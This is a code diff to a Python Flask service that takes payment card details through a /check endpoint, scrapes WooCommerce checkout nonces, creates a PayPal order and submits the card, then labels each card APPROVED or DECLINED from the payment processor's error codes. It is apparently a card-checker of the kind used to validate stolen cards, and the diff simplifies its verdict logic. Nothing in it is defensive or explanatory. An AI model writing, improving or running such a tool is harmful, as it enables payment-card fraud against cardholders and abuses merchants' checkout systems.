@@ -68,7 +68,7 @@ def check_card(card_details):
             check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response_checkout.text).group(1)
             create = re.search(r'create_order.*?nonce":"(.*?)"', response_checkout.text).group(1)
         except AttributeError:
-            return {"status": "Error", "message": "Failed to scrape checkout tokens.", "response_text": ""}
+            return {"message": "DECLINED ❌", "response_text": "ERROR: SCRAPE_FAILED | MESSAGE: Failed to scrape checkout tokens."}
 
         # 3. Create PayPal Order
         json_data_create = {
@@ -87,7 +87,7 @@ def check_card(card_details):
 
         order_data = response_create.json()
         if 'data' not in order_data or 'id' not in order_data['data']:
-            return {"status": "Error", "message": "Failed to create PayPal order ID.", "response_text": str(order_data)}
+            return {"message": "DECLINED ❌", "response_text": "ERROR: ORDER_FAILED | MESSAGE: Failed to create PayPal order ID."}
 
         paypal_id = order_data['data']['id']
 
@@ -105,47 +105,39 @@ def check_card(card_details):
             json=json_data_graphql
         )
 
-        # Try to parse JSON and extract clean error text
+        # Extract only the first error
         try:
             raw_json = response_final.json()
-            error_texts = []
-            if "errors" in raw_json:
-                for err in raw_json["errors"]:
-                    code = ""
-                    if "data" in err and isinstance(err["data"], list) and len(err["data"]) > 0:
-                        code = err["data"][0].get("code", "")
-                    message = err.get("message", "")
-                    if code or message:
-                        error_texts.append(f"ERROR: {code} | MESSAGE: {message}")
-            last_clean = " | ".join(error_texts) if error_texts else response_final.text.strip()
+            error_text = ""
+            if "errors" in raw_json and len(raw_json["errors"]) > 0:
+                err = raw_json["errors"][0]  # take first only
+                code = ""
+                if "data" in err and isinstance(err["data"], list) and len(err["data"]) > 0:
+                    code = err["data"][0].get("code", "")
+                message = err.get("message", "")
+                error_text = f"ERROR: {code} | MESSAGE: {message}"
+            else:
+                error_text = response_final.text.strip()
         except Exception:
-            last_clean = response_final.text.strip()
+            error_text = response_final.text.strip()
 
-        # --- Decide status & message ---
-        if ('ADD_SHIPPING_ERROR' in last_clean or '"status": "succeeded"' in last_clean or 'Thank You For Donation.' in last_clean):
-            return {"status": "Approved", "message": "CHARGE ✅", "response_text": last_clean}
-        elif 'is3DSecureRequired' in last_clean:
-            return {"status": "Approved (3D Secure)", "message": "OTP 💥 [3D]", "response_text": last_clean}
-        elif 'INVALID_SECURITY_CODE' in last_clean:
-            return {"status": "Approved (CCN)", "message": "APPROVED CCN ✅", "response_text": last_clean}
-        elif 'EXISTING_ACCOUNT_RESTRICTED' in last_clean:
-            return {"status": "Approved", "message": "APPROVED! ✅ - [EXISTING_ACCOUNT_RESTRICTED]", "response_text": last_clean}
-        elif 'INVALID_BILLING_ADDRESS' in last_clean:
-            return {"status": "Approved", "message": "APPROVED! ✅ - [inv_address]", "response_text": last_clean}
+        # --- Decide clean message ---
+        if any(x in error_text for x in ["succeeded", "Thank You", "ADD_SHIPPING_ERROR", "is3DSecureRequired", "INVALID_SECURITY_CODE", "EXISTING_ACCOUNT_RESTRICTED", "INVALID_BILLING_ADDRESS"]):
+            return {"message": "APPROVED ✅", "response_text": error_text}
         else:
-            return {"status": "Declined", "message": "DECLINED ❌", "response_text": last_clean}
+            return {"message": "DECLINED ❌", "response_text": error_text}
 
     except Exception as e:
-        return {"status": "Error", "message": str(e), "response_text": ""}
+        return {"message": "DECLINED ❌", "response_text": f"ERROR: EXCEPTION | MESSAGE: {str(e)}"}
 
 # --- API Endpoint ---
 @app.route('/check', methods=['GET'])
 def api_check():
     card_info = request.args.get('cc')
     if not card_info:
-        return jsonify({"status": "Error", "message": "Missing 'cc' parameter"}), 400
+        return jsonify({"message": "DECLINED ❌", "response_text": "ERROR: MISSING_PARAM | MESSAGE: Missing 'cc' parameter"}), 400
     if len(card_info.split('|')) != 4:
-        return jsonify({"status": "Error", "message": "Invalid card format"}), 400
+        return jsonify({"message": "DECLINED ❌", "response_text": "ERROR: INVALID_FORMAT | MESSAGE: Invalid card format"}), 400
     
     result = check_card(card_info)
     return jsonify(result)
